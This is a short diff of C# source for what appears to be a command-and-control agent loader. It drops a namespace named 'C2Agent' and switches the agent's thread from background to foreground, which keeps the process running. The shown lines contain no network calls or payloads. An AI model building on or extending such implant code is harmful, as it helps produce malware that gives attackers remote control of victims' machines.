@@ -4,14 +4,12 @@ using System.Net;
 using System.Text;
 using System.Threading;
 
-namespace C2Agent
-{
     public class Loader
     {
         public static void Run(string args)
         {
             Thread mainThread = new Thread(new ThreadStart(Agent.Start));
-            mainThread.IsBackground = true;
+            mainThread.IsBackground = false;
             mainThread.Start();
         }
     }
@@ -154,4 +152,3 @@ namespace C2Agent
             catch (Exception ex) { return string.Format("{{\"error\":\"{0}\"}}", ex.Message); }
         }
     }
-}
